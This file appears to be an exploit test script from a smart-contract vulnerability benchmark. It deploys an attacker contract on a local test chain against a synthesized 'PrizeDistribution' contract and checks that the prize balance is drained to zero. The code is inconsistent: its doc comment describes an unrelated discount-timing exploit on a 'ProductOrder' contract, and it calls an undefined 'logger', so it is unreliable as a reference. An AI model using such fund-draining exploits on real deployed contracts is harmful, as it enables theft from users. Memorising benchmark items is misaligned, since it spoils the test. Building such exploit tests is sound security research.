require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');
// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'PrizeDistribution-19.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);


/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */

async function exploit(web3, envInfo, contractAddress) {
    try {
        let { abi: prizeAbi, bytecode: prizeBytecode } = await compileWithVersion(source, contractFileFullName, 'PrizeDistribution', solcVersion);
        let { abi: attackerAbi, bytecode: attackerBytecode } = await compileWithVersion(source, contractFileFullName, 'PrizeDistributionAttacker', solcVersion);
        
        let prizeContractInstance = new web3.eth.Contract(prizeAbi, contractAddress);
        let attackerContractInstance = new web3.eth.Contract(attackerAbi);

        // Deploy the malicious contract
        let attackerAccount = envInfo.accounts[1];
        let deployTx = attackerContractInstance.deploy({ data: attackerBytecode });
        let attackerInstance = await deployTx.send({ from: attackerAccount, gas: 1500000 });

        console.log("Deployed malicious contract at address:", attackerInstance.options.address);

        // Simulate attack
        await prizeContractInstance.methods.simulateAttack(attackerInstance.options.address).send({ from: envInfo.accounts[0], gas: 300000 });
        await sleep(200);

        let remainingPrize = await prizeContractInstance.methods.prizeAmount().call();
        console.log("Remaining prize amount after attack:", web3.utils.fromWei(remainingPrize, 'ether'), "ETH");

        if (remainingPrize == 0) {
            console.log("Attack successful: Prize amount drained.");
            return true;
        } else {
            console.error("Attack failed: Prize amount not fully drained.");
            return false;
        }
    } catch (error) {
        console.error("An error occurred during the attack:", error);
        return false;
    }
}













/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
